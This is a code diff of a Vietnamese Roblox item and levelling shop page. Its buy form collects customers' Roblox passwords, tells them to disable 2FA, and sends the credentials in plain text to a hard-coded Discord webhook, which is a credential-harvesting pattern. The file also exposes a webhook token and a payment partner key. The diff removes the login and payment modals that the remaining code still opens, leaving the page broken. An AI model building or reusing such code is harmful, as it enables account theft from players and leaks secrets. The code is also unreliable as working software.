@@ -13,190 +13,137 @@
         
         :root {
             --primary: #ff4757;
-            --secondary: #2f3542;
-            --accent: #ffa502;
+            --bg-dark: #070b14;
         }
 
         body { 
-            background-color: #0f172a; 
+            background-color: var(--bg-dark); 
             color: #f8fafc;
             font-family: 'Outfit', sans-serif;
-            background-image: radial-gradient(circle at 50% 0%, #1e293b 0%, #0f172a 100%);
+            margin: 0;
+            position: relative;
+            min-h-screen;
+        }
+
+        /* ẢNH NỀN CHÌM THEO Ý NGHĨA */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-image: url('https://i.postimg.cc/GpBcWDGG/Anh-chup-man-hinh-2026-01-31-170437.png'); 
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            opacity: 0.12; /* Độ mờ chìm vừa phải */
+            z-index: -1;
+            filter: blur(1px); /* Nhòe nhẹ để không rối mắt */
         }
 
         .font-game { font-family: 'Bangers', cursive; letter-spacing: 1px; }
 
-        /* Hiệu ứng thẻ sản phẩm */
         .glass-card {
-            background: rgba(30, 41, 59, 0.7);
-            backdrop-filter: blur(12px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(15, 23, 42, 0.75);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.05);
             border-radius: 2rem;
-            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
         .glass-card:hover {
-            transform: translateY(-10px) scale(1.02);
+            transform: translateY(-8px);
             border-color: var(--primary);
-            box-shadow: 0 20px 40px rgba(255, 71, 87, 0.2);
+            box-shadow: 0 15px 30px rgba(255, 71, 87, 0.2);
         }
 
         .btn-premium {
             background: linear-gradient(135deg, #ff4757 0%, #ff6b81 100%);
-            box-shadow: 0 4px 15px rgba(255, 71, 87, 0.4);
+            box-shadow: 0 4px 15px rgba(255, 71, 87, 0.3);
             transition: 0.3s;
         }
 
-        .btn-premium:hover {
-            transform: scale(1.05);
-            filter: brightness(1.2);
-        }
-
-        /* Tab Active */
         .tab-active {
             background: var(--primary) !important;
             color: white !important;
-            box-shadow: 0 0 20px rgba(255, 71, 87, 0.5);
+            box-shadow: 0 0 15px rgba(255, 71, 87, 0.4);
         }
 
         .modal-blur {
-            backdrop-filter: blur(15px);
+            backdrop-filter: blur(12px);
             background: rgba(0, 0, 0, 0.7);
         }
-
-        /* Animation */
-        @keyframes float {
-            0% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
-            100% { transform: translateY(0px); }
-        }
-        .animate-float { animation: float 3s ease-in-out infinite; }
     </style>
 </head>
-<body class="min-h-screen pb-20">
+<body>
 
-    <nav class="sticky top-0 z-50 bg-slate-900/80 backdrop-blur-md border-b border-white/10 px-6 py-4">
+    <nav class="sticky top-0 z-50 bg-slate-950/80 backdrop-blur-md border-b border-white/5 px-6 py-4">
         <div class="max-w-7xl mx-auto flex justify-between items-center">
             <div class="flex items-center gap-3 cursor-pointer" onclick="location.reload()">
-                <img src="https://i.postimg.cc/rmgryzV2/Anh-chup-man-hinh-2026-01-30-163900.png" class="h-12 drop-shadow-[0_0_10px_rgba(255,71,87,0.5)]">
-                <h1 class="text-3xl font-game italic uppercase text-white">BAP <span class="text-red-500">SHOP</span></h1>
+                <img src="https://i.postimg.cc/rmgryzV2/Anh-chup-man-hinh-2026-01-30-163900.png" class="h-10 drop-shadow-[0_0_8px_rgba(255,71,87,0.4)]">
+                <h1 class="text-2xl font-game italic text-white tracking-wider">BAP <span class="text-red-500">SHOP</span></h1>
             </div>
             
-            <div id="user-info" class="hidden flex items-center gap-4">
+            <div id="user-info" class="hidden flex items-center gap-4 text-xs font-bold uppercase">
                 <div class="text-right">
-                    <p id="display-name" class="font-black text-sm text-white uppercase"></p>
-                    <p class="text-yellow-400 font-bold text-xs">💰 <span id="balance">0</span>đ</p>
+                    <p id="display-name" class="text-white"></p>
+                    <p class="text-red-500"><span id="balance">0</span>đ</p>
                 </div>
-                <button onclick="auth.signOut().then(()=>location.reload())" class="bg-white/10 hover:bg-white/20 p-2 rounded-xl transition">
-                    <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M17 16l4-4m0 0l-4-4m4 4H7m6 4v1a3 3 0 01-3 3H6a3 3 0 01-3-3V7a3 3 0 013-3h4a3 3 0 013 3v1" /></svg>
-                </button>
+                <button onclick="auth.signOut().then(()=>location.reload())" class="bg-white/5 p-2 rounded-lg">Thoát</button>
             </div>
-            <button id="auth-btn" onclick="openForm('auth')" class="btn-premium text-white px-8 py-2.5 rounded-full font-black text-sm uppercase tracking-wider">Đăng Nhập</button>
+            <button id="auth-btn" onclick="openForm('auth')" class="btn-premium text-white px-6 py-2 rounded-full font-black text-xs uppercase">Đăng Nhập</button>
         </div>
     </nav>
 
-    <main class="max-w-7xl mx-auto px-4 mt-8">
-        <div class="relative group mb-12">
-            <div class="absolute -inset-1 bg-gradient-to-r from-red-600 to-yellow-600 rounded-[3rem] blur opacity-25 group-hover:opacity-50 transition duration-1000"></div>
-            <img src="https://i.postimg.cc/GpBcWDGG/Anh-chup-man-hinh-2026-01-31-170437.png" class="relative w-full rounded-[2.5rem] border-2 border-white/10 shadow-2xl">
+    <main class="max-w-6xl mx-auto px-4 mt-8">
+        <div class="mb-12 overflow-hidden rounded-[2.5rem] border border-white/10 shadow-2xl">
+            <img src="https://i.postimg.cc/GpBcWDGG/Anh-chup-man-hinh-2026-01-31-170437.png" class="w-full">
         </div>
 
-        <div class="grid grid-cols-2 md:grid-cols-2 gap-6 mb-12">
-            <button onclick="openForm('card')" class="glass-card p-6 flex items-center justify-center gap-4 hover:bg-red-500 group transition-all">
-                <span class="text-3xl group-hover:scale-125 transition">💳</span>
-                <div class="text-left">
-                    <p class="font-black uppercase italic">Nạp Thẻ Cào</p>
-                    <p class="text-[10px] opacity-60 font-bold">TỰ ĐỘNG - CHIẾT KHẤU 20%</p>
-                </div>
+        <div class="grid grid-cols-2 gap-4 mb-10">
+            <button onclick="openForm('card')" class="glass-card p-6 flex items-center justify-center gap-3 hover:bg-red-500/10 transition-all">
+                <span class="text-2xl">💳</span>
+                <p class="font-black uppercase text-xs">Nạp Thẻ Cào</p>
             </button>
-            <button onclick="openForm('bank')" class="glass-card p-6 flex items-center justify-center gap-4 hover:bg-green-600 group transition-all">
-                <span class="text-3xl group-hover:scale-125 transition">🏦</span>
-                <div class="text-left">
-                    <p class="font-black uppercase italic">Nạp ATM/MOMO</p>
-                    <p class="text-[10px] opacity-60 font-bold">DUYỆT NHANH 1-5 PHÚT</p>
-                </div>
+            <button onclick="openForm('bank')" class="glass-card p-6 flex items-center justify-center gap-3 hover:bg-green-500/10 transition-all">
+                <span class="text-2xl">🏦</span>
+                <p class="font-black uppercase text-xs">ATM / QR Code</p>
             </button>
         </div>
 
-        <div class="flex justify-center gap-4 mb-10">
-            <button onclick="showTab('fruit')" id="btn-fruit" class="tab-active px-6 py-3 rounded-2xl glass-card font-black uppercase text-xs italic">🍎 Trái Ác Quỷ</button>
-            <button onclick="showTab('gp')" id="btn-gp" class="px-6 py-3 rounded-2xl glass-card font-black uppercase text-xs italic">🎫 Gamepass</button>
-            <button onclick="showTab('ct')" id="btn-ct" class="px-6 py-3 rounded-2xl glass-card font-black uppercase text-xs italic">⚔️ Cày Thuê</button>
+        <div class="flex justify-center gap-3 mb-10 overflow-x-auto pb-2">
+            <button onclick="showTab('fruit')" id="btn-fruit" class="tab-active px-6 py-3 rounded-xl glass-card font-black uppercase text-[10px] whitespace-nowrap">🍎 Trái Ác Quỷ</button>
+            <button onclick="showTab('gp')" id="btn-gp" class="px-6 py-3 rounded-xl glass-card font-black uppercase text-[10px] whitespace-nowrap">🎫 Gamepass</button>
+            <button onclick="showTab('ct')" id="btn-ct" class="px-6 py-3 rounded-xl glass-card font-black uppercase text-[10px] whitespace-nowrap">⚔️ Cày Thuê</button>
         </div>
 
-        <div id="fruit-list" class="grid grid-cols-2 md:grid-cols-4 gap-8"></div>
-        <div id="gp-list" class="hidden grid grid-cols-2 md:grid-cols-4 gap-8"></div>
-        <div id="ct-list" class="hidden grid grid-cols-2 md:grid-cols-4 gap-8"></div>
+        <div id="fruit-list" class="grid grid-cols-2 md:grid-cols-4 gap-6"></div>
+        <div id="gp-list" class="hidden grid grid-cols-2 md:grid-cols-4 gap-6"></div>
+        <div id="ct-list" class="hidden grid grid-cols-2 md:grid-cols-4 gap-6"></div>
 
-        <div class="mt-24 glass-card p-8 md:p-12 mb-20">
-            <h3 class="font-game text-3xl italic mb-8 text-white tracking-widest uppercase border-l-4 border-red-500 pl-4">Lịch sử giao dịch</h3>
-            <div class="overflow-x-auto">
-                <table class="w-full text-left text-sm font-bold">
-                    <thead class="text-slate-500 uppercase text-[10px] border-b border-white/5">
-                        <tr><th class="pb-4">Mã đơn</th><th class="pb-4">Sản phẩm</th><th class="pb-4">Giá tiền</th><th class="pb-4">Trạng thái</th></tr>
-                    </thead>
-                    <tbody id="history-list" class="divide-y divide-white/5"></tbody>
+        <div class="mt-20 glass-card p-8 mb-20">
+            <h3 class="font-game text-2xl mb-6 text-white border-l-4 border-red-500 pl-3">LỊCH SỬ GIAO DỊCH</h3>
+            <div class="overflow-x-auto text-[11px] font-bold">
+                <table class="w-full text-left uppercase">
+                    <tbody id="history-list"></tbody>
                 </table>
             </div>
         </div>
     </main>
 
     <div id="modal-buy" class="fixed inset-0 modal-blur z-[100] hidden items-center justify-center p-4">
-        <div class="glass-card bg-slate-900 p-8 w-full max-w-md border-t-4 border-red-500">
-            <h2 id="buy-title" class="font-game text-4xl text-center text-red-500 mb-6 italic"></h2>
-            <div class="space-y-4">
-                <input id="buy-acc" placeholder="TÀI KHOẢN ROBLOX" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none focus:border-red-500 font-bold">
-                <input id="buy-pass" type="password" placeholder="MẬT KHẨU ROBLOX" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none focus:border-red-500 font-bold">
-                <div id="ct-note" class="hidden text-[10px] text-yellow-500 font-black uppercase text-center">⚠️ Lưu ý: Tắt bảo mật 2FA để Admin vào cày!</div>
-                <button onclick="processBuy()" class="btn-premium w-full py-5 rounded-2xl font-black uppercase shadow-red-500/20">Thanh Toán Ngay</button>
-                <button onclick="closeAll()" class="w-full text-slate-500 text-xs font-bold uppercase py-2">Hủy bỏ</button>
+        <div class="glass-card bg-slate-900 p-8 w-full max-w-sm">
+            <h2 id="buy-title" class="font-game text-3xl text-center text-red-500 mb-6 italic"></h2>
+            <div class="space-y-3">
+                <input id="buy-acc" placeholder="TÀI KHOẢN ROBLOX" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none focus:border-red-500 font-bold text-sm">
+                <input id="buy-pass" type="password" placeholder="MẬT KHẨU ROBLOX" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none focus:border-red-500 font-bold text-sm">
+                <div id="ct-note" class="hidden text-[10px] text-yellow-500 font-black text-center">TẮT 2FA TRƯỚC KHI MUA</div>
+                <button onclick="processBuy()" class="btn-premium w-full py-4 rounded-xl font-black uppercase text-sm">Xác nhận</button>
+                <button onclick="closeAll()" class="w-full text-slate-500 text-[10px] font-black uppercase pt-2">Đóng</button>
             </div>
-        </div>
-    </div>
-
-    <div id="modal-card" class="fixed inset-0 modal-blur z-[100] hidden items-center justify-center p-4">
-        <div class="glass-card bg-slate-900 p-8 w-full max-w-md border-t-4 border-blue-500 text-center">
-            <h2 class="font-game text-4xl text-blue-500 mb-6 italic uppercase">Nạp Thẻ Tự Động</h2>
-            <select id="card-type" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl mb-3 outline-none font-bold"><option value="VIETTEL">VIETTEL</option><option value="VINAPHONE">VINAPHONE</option><option value="MOBIFONE">MOBIFONE</option></select>
-            <select id="card-amount" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl mb-3 outline-none font-bold"><option value="10000">10,000đ</option><option value="20000">20,000đ</option><option value="50000">50,000đ</option><option value="100000">100,000đ</option><option value="200000">200,000đ</option></select>
-            <input id="card-seri" placeholder="SỐ SERI" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl mb-3 outline-none font-bold">
-            <input id="card-pin" placeholder="MÃ THẺ (PIN)" class="w-full bg-white/5 border border-white/10 p-4 rounded-xl mb-6 outline-none font-bold">
-            <button onclick="sendCard()" class="w-full bg-blue-600 hover:bg-blue-700 py-5 rounded-2xl font-black uppercase transition-all shadow-lg">Gửi Thẻ Ngay</button>
-            <button onclick="closeAll()" class="mt-4 text-slate-500 text-xs font-bold uppercase">Đóng</button>
-        </div>
-    </div>
-
-    <div id="modal-auth" class="fixed inset-0 modal-blur z-[100] hidden items-center justify-center p-4">
-        <div class="glass-card bg-slate-900 p-10 w-full max-w-sm text-center">
-            <img src="https://i.postimg.cc/rmgryzV2/Anh-chup-man-hinh-2026-01-30-163900.png" class="h-16 mx-auto mb-8 animate-float">
-            <div class="space-y-4">
-                <input id="auth-u" placeholder="Tên đăng nhập..." class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none font-bold">
-                <input id="auth-p" type="password" placeholder="Mật khẩu..." class="w-full bg-white/5 border border-white/10 p-4 rounded-xl outline-none font-bold">
-                <button onclick="handleLogin()" class="btn-premium w-full py-4 rounded-2xl font-black uppercase">Đăng Nhập</button>
-                <p class="text-slate-500 text-[10px] font-bold uppercase cursor-pointer" onclick="handleRegister()">Chưa có tài khoản? Đăng ký ngay</p>
-            </div>
-        </div>
-    </div>
-
-    <div id="modal-bank" class="fixed inset-0 modal-blur z-[100] hidden items-center justify-center p-4">
-        <div class="glass-card bg-slate-900 p-8 w-full max-w-md text-center border-t-4 border-green-500">
-            <h2 class="font-game text-4xl text-green-500 mb-6 italic uppercase">Quét Mã QR</h2>
-            <img src="https://i.postimg.cc/N0tWGcvJ/74b766b2-91f0-441c-95da-71b054c4a8c2.jpg" class="w-64 mx-auto rounded-3xl mb-6 border-2 border-white/10 shadow-2xl">
-            <div class="text-left bg-white/5 p-4 rounded-2xl text-xs font-bold uppercase mb-6 leading-loose">
-                <p>Ngân hàng: <span class="text-green-400">Agribank</span></p>
-                <p>Chủ TK: <span class="text-green-400">Ly Thi Hoa</span></p>
-                <p class="text-xl text-red-500">STK: 228205353447</p>
-            </div>
-            <button onclick="baoDaBank()" class="w-full bg-green-600 py-4 rounded-2xl font-black uppercase">Tôi đã chuyển khoản</button>
         </div>
     </div>
 
     <script>
-        // Copy phần Script từ câu trả lời trước của mình và dán vào đây nhé Nghĩa! 
-        // Đã bao gồm các hàm showTab, processBuy, sendCard, handleLogin...
-        // Mình chỉ tập trung thay đổi phần HTML/CSS để giao diện cực đẹp cho bạn.
-        
-        // --- CHỈ CẦN DÁN LẠI ĐOẠN SCRIPT CŨ VÀO ĐÂY LÀ CHẠY 100% ---
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1466717724204994602/a5NCBrv_gid1T2iuG0HY9xPujmQE9OXlAT8nit1MbU74-edRnPBbQcgsx-oMHke0EorV";
         const NP_ID = "9565963734";
         const NP_KEY = "80df3668af04f2a85e1befc277896513";
@@ -251,7 +198,7 @@
                 {n:"X2 Drop VV", p:40000, img:"https://i.postimg.cc/PrTSgHwD/Anh-chup-man-hinh-2026-01-28-113631.png"},
                 {n:"Fast Boat VV", p:40000, img:"https://i.postimg.cc/HkLBLt3Y/Anh-chup-man-hinh-2026-01-28-113635.png"}
             ],
-           ct: [
+            ct: [
                 {n:"Cày Thuê Level 1-2800", p:20000, img:"https://i.imgur.com/vHq0FpX.png"},
                 {n:"Lấy Võ V2 (Tặng Full Chiêu)", p:30000, img:"https://i.imgur.com/vHq0FpX.png"},
                 {n:"Thức Tỉnh Trái V2 (Lửa-Chấn Động)", p:20000, img:"https://i.imgur.com/vHq0FpX.png"},
@@ -264,27 +211,27 @@
         function render() {
             Object.keys(products).forEach(tab => {
                 document.getElementById(tab+'-list').innerHTML = products[tab].map((p, i) => `
-                    <div class="glass-card p-4 text-center flex flex-col">
-                        <div class="overflow-hidden rounded-2xl mb-4"><img src="${p.img}" class="w-full aspect-square object-cover hover:scale-110 transition duration-500"></div>
-                        <h4 class="font-black text-xs uppercase mb-1 truncate text-white">${p.n}</h4>
-                        <p class="text-red-500 font-game text-xl italic mb-4">${p.p.toLocaleString()}đ</p>
-                        <button onclick="openBuy('${tab}', ${i})" class="btn-premium text-white py-3 w-full rounded-xl font-black text-[10px] uppercase">Mua Ngay</button>
+                    <div class="glass-card p-4 text-center">
+                        <img src="${p.img}" class="w-full aspect-square object-cover rounded-xl mb-4 shadow-lg">
+                        <h4 class="font-black text-[10px] uppercase mb-1 truncate text-white">${p.n}</h4>
+                        <p class="text-red-500 font-game text-lg mb-4">${p.p.toLocaleString()}đ</p>
+                        <button onclick="openBuy('${tab}', ${i})" class="btn-premium text-white py-2.5 w-full rounded-lg font-black text-[9px] uppercase">Mua Ngay</button>
                     </div>`).join('');
             });
         }
         render();
 
         let curItem = {};
-        function openBuy(tab, i) { if(!auth.currentUser) return openForm('auth'); curItem = products[tab][i]; document.getElementById('buy-title').innerText = curItem.n; document.getElementById('ct-note').className = (tab === 'ct') ? "block text-[10px] text-yellow-500 font-black mb-4 uppercase italic" : "hidden"; openForm('buy'); }
+        function openBuy(tab, i) { if(!auth.currentUser) return openForm('auth'); curItem = products[tab][i]; document.getElementById('buy-title').innerText = curItem.n; document.getElementById('ct-note').className = (tab === 'ct') ? "block text-[10px] text-yellow-500 font-black mb-4 uppercase" : "hidden"; openForm('buy'); }
         async function processBuy() {
             const acc = document.getElementById('buy-acc').value, pass = document.getElementById('buy-pass').value;
             const snap = await db.ref('users/' + auth.currentUser.uid).get();
             const bal = snap.val().balance || 0;
-            if(!acc || !pass) return alert("Vui lòng điền đủ thông tin!");
+            if(!acc || !pass) return alert("Thiếu thông tin!");
             if(bal < curItem.p) return alert("Không đủ tiền!");
             fetch(DISCORD_WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ content: `🛒 **ĐƠN MỚI:** ${curItem.n} | Khách: ${snap.val().username} | TK: \`${acc}\` | MK: \`${pass}\`` })});
             await db.ref('users/' + auth.currentUser.uid).update({ balance: bal - curItem.p });
-            await db.ref('orders').push({ uid: auth.currentUser.uid, user: snap.val().username, prod: curItem.n, status: "Đang chờ", time: Date.now() });
+            await db.ref('orders').push({ uid: auth.currentUser.uid, user: snap.val().username, prod: curItem.n, price: curItem.p, status: "Chờ duyệt", time: Date.now() });
             alert("Mua thành công!"); closeAll();
         }
         function showTab(t) { ['fruit','gp','ct'].forEach(id => { document.getElementById(id+'-list').classList.add('hidden'); document.getElementById('btn-'+id).classList.remove('tab-active'); }); document.getElementById(t+'-list').classList.remove('hidden'); document.getElementById('btn-'+t).classList.add('tab-active'); }
@@ -297,21 +244,16 @@
                     document.getElementById('balance').innerText = (s.val().balance || 0).toLocaleString(); 
                 });
                 db.ref('orders').orderByChild('uid').equalTo(u.uid).on('value', s => {
-                    let h = ""; s.forEach(c => { h += `<tr class="border-b border-white/5"><td class="py-4 text-slate-500">#${c.key.substring(1,7).toUpperCase()}</td><td class="text-white uppercase">${c.val().prod}</td><td class="text-red-500">${(c.val().price || 0).toLocaleString()}đ</td><td class="text-blue-400 italic uppercase">${c.val().status}</td></tr>`; });
+                    let h = ""; s.forEach(c => { h += `<tr class="border-b border-white/5"><td class="py-4 text-slate-500">#${c.key.substring(1,5)}</td><td class="text-white">${c.val().prod}</td><td class="text-red-500">${c.val().price.toLocaleString()}đ</td><td class="text-blue-400 italic">${c.val().status}</td></tr>`; });
                     document.getElementById('history-list').innerHTML = h;
                 });
             }
         });
-        async function sendCard() {
-            const type = document.getElementById('card-type').value, amount = document.getElementById('card-amount').value, seri = document.getElementById('card-seri').value, pin = document.getElementById('card-pin').value;
-            const apiURL = `https://doithe1s.vn/api/card-auto.php?type=${type}&amount=${amount}&pin=${pin}&seri=${seri}&partner_id=${NP_ID}&partner_key=${NP_KEY}&request_id=${Math.random()}&content=${auth.currentUser.uid}`;
-            try { await fetch(apiURL); alert("Gửi thẻ thành công!"); } catch(e) {} closeAll();
-        }
         function openForm(id) { document.getElementById('modal-'+id).style.display = 'flex'; }
         function closeAll() { document.querySelectorAll('.fixed').forEach(m => m.style.display = 'none'); }
-        async function baoDaBank() { const m = prompt("Số tiền nạp?"); if(m) { await db.ref('nap_bank').push({ uid: auth.currentUser.uid, username: document.getElementById('display-name').innerText, amount: parseInt(m), status: "Chờ duyệt", time: Date.now() }); alert("Admin sẽ duyệt!"); closeAll(); } }
-        async function handleLogin() { try { await auth.signInWithEmailAndPassword(document.getElementById('auth-u').value.toLowerCase()+"@bap.shop", document.getElementById('auth-p').value); location.reload(); } catch(e) { alert("Lỗi đăng nhập!"); } }
-        async function handleRegister() { try { const r = await auth.createUserWithEmailAndPassword(document.getElementById('auth-u').value.toLowerCase()+"@bap.shop", document.getElementById('auth-p').value); await db.ref('users/'+r.user.uid).set({username: document.getElementById('auth-u').value, balance: 0}); location.reload(); } catch(e) { alert("Lỗi đăng ký!"); } }
+        async function handleLogin() { try { await auth.signInWithEmailAndPassword(document.getElementById('auth-u').value.toLowerCase()+"@bap.shop", document.getElementById('auth-p').value); location.reload(); } catch(e) { alert("Sai MK!"); } }
+        async function handleRegister() { try { const r = await auth.createUserWithEmailAndPassword(document.getElementById('auth-u').value.toLowerCase()+"@bap.shop", document.getElementById('auth-p').value); await db.ref('users/'+r.user.uid).set({username: document.getElementById('auth-u').value, balance: 0}); location.reload(); } catch(e) { alert("Lỗi!"); } }
     </script>
-</body>
+
+    </body>
 </html>
